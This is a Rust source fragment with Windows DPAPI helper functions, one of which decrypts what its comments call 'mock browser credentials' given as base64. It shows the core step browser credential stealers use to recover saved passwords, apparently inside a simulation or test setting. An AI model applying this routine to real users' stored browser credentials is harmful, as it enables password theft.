/// Raw DPAPI decrypt — takes raw ciphertext bytes, returns plaintext bytes.
#[cfg(windows)]
fn dpapi_decrypt_bytes(encrypted: &[u8]) -> Option<Vec<u8>> {
    use winapi::um::dpapi::CryptUnprotectData;
    use winapi::um::winbase::LocalFree;
    use winapi::um::wincrypt::DATA_BLOB;
    unsafe {
        let mut input_blob = DATA_BLOB {
            cbData: encrypted.len() as u32,
            pbData: encrypted.as_ptr() as *mut u8,
        };
        let mut output_blob = DATA_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        let ok = CryptUnprotectData(
            &mut input_blob,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            &mut output_blob,
        );
        if ok != 0 && !output_blob.pbData.is_null() {
            let result =
                std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize)
                    .to_vec();
            LocalFree(output_blob.pbData as *mut _);
            Some(result)
        } else {
            None
        }
    }
}

// DPAPI decryption for mock browser credentials (base64-encoded input)
#[cfg(windows)]
fn mock_dpapi_decrypt(encrypted_b64: &str) -> String {
    // Try DPAPI decryption first (for passwords encrypted with CryptProtectData)
    match decode(encrypted_b64) {
        Ok(encrypted_bytes) => {
            unsafe {
                let mut input_blob = DATA_BLOB {
                    cbData: encrypted_bytes.len() as u32,
                    pbData: encrypted_bytes.as_ptr() as *mut u8,
                };
                let mut output_blob = DATA_BLOB {
                    cbData: 0,
                    pbData: std::ptr::null_mut(),
                };

                let result = CryptUnprotectData(
                    &mut input_blob,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    0,
                    &mut output_blob,
                );

                if result != 0 && !output_blob.pbData.is_null() {
                    let decrypted =
                        std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize);
                    let decrypted_string = String::from_utf8_lossy(decrypted).to_string();
                    LocalFree(output_blob.pbData as *mut _);
                    return decrypted_string;
                }
            }
            // DPAPI failed, try base64 decode as fallback
            String::from_utf8(encrypted_bytes).unwrap_or_else(|_| encrypted_b64.to_string())
        }
        Err(_) => encrypted_b64.to_string(),
    }
}

#[cfg(not(windows))]
fn mock_dpapi_decrypt(encrypted_b64: &str) -> String {
    // On non-Windows, just base64 decode
    match decode(encrypted_b64) {
        Ok(bytes) => String::from_utf8(bytes).unwrap_or_else(|_| encrypted_b64.to_string()),
        Err(_) => encrypted_b64.to_string(),
    }
}

